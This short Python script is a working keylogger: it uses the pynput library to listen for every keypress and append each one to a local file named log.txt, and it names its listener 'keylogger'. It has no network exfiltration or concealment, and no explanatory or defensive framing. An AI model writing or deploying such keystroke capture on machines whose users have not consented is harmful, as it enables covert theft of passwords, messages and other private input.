from pynput.keyboard import Listener

def function(key):
	file1 = open("log.txt" , "a")
	file1.write(str(key))
	file1.close()
	
with Listener(on_press = function) as keylogger:
	keylogger.join()
	
